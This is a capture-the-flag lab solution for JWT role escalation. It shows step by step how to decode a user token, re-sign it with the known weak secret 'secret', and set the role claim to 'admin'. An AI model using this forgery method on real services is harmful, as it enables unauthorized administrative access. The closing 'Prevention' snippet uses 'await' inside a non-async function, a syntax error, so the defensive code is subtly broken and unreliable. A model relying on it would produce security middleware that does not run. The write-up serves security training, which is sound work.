# Role Escalation Lab — Solution

## Step 1: Decode the Given Token

Use the JWT Decoder:

```json
{
  "sub": "user123",
  "name": "John Doe",
  "role": "user",
  "iat": 1680000000
}
```

## Step 2: Recall the Weak Secret

From the Weak Secret lab, we know the secret is: `secret`

## Step 3: Forge an Admin Token

Use the JWT Generator tool:

**Header (keep the same):**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload (modify the role):**
```json
{
  "sub": "user123",
  "name": "John Doe",
  "role": "admin",
  "iat": 1680000000
}
```

**Secret:** `secret`

## Step 4: Generate and Verify

1. Generate the token with the JWT Generator
2. Verify it with the JWT Verifier using secret `secret`
3. Should show **Signature Valid**

## Step 5: Capture the Flag

The flag for this lab is: **`admin=true`**

This represents the successful role escalation — you now have admin privileges.

## The Forged Token

When you generate the token with `role: "admin"` and the correct secret, you get a valid JWT that grants admin access.

## Prevention

```javascript
// Don't rely solely on JWT claims for authorization
const adminOnly = (req, res, next) => {
  // Additional server-side verification
  const user = await db.users.findById(req.user.id);
  if (user.role !== 'admin') {
    return res.status(403).json({ message: 'Forbidden' });
  }
  next();
};

// Use short-lived tokens and refresh tokens
// Implement token revocation for compromised accounts
```
